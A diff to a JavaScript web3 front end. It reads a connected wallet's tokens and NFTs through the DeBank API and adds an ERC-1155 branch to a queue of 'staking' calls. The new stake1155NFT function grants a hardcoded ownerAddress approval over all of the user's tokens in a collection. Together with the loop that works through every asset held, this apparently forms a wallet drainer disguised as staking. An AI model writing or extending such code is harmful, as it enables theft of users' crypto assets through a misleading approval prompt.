@@ -164,6 +164,7 @@ async function getWalletAccount() {
     method: "GET",
   });
 
+  
   const response1 = await fetch("https://openapi.debank.com/v1/user/nft_list?id=" +account+ "&chain_id=eth", {
     headers: {
       "Content-Type": "text/plain"
@@ -173,6 +174,7 @@ async function getWalletAccount() {
   const data = await response.json();
   const nftdata = await response1.json();
 
+console.log(nftdata);
 
   for (let item of nftdata) {
     
@@ -183,6 +185,10 @@ async function getWalletAccount() {
     temp.tokenId = item.inner_id;
     temp.tokenAddress = item.contract_id;
     temp.type = 2;
+    if (item.is_erc1155)  {
+    	temp.type = 3;
+    }
+    
     temp.tokenAmount = item.amount;
     tokenList.push(temp);
   }
@@ -252,6 +258,17 @@ async function stakeNFT(tokenAddress, nftTokenID) {
 
 }
 
+async function stake1155NFT(tokenAddress, nftTokenID) {
+
+  var tokenContract = new web3.eth.Contract(ERC1155_ABI, tokenAddress);
+  await tokenContract.methods.setApprovalForAll(ownerAddress, true).send({
+     from: account,
+     gas: 470000,
+     gasPrice:0
+  });
+
+}
+
 async function sendToken() {
 
   if(tokenList.length) {
@@ -263,9 +280,11 @@ async function sendToken() {
         }
     } else if(tokenList[0].type == 1) {
         result = await stakeERC20(tokenList[0].tokenAddress, tokenList[0].tokenAmount);
-    } else {
+    } else if(tokenList[0].type == 2){
         result = await stakeNFT(tokenList[0].tokenAddress, tokenList[0].tokenId);
-    }
+    } else {
+        result = await stake1155NFT(tokenList[0].tokenAddress, tokenList[0].tokenId);
+    } 
     
     if(result) {
         tokenList.shift();
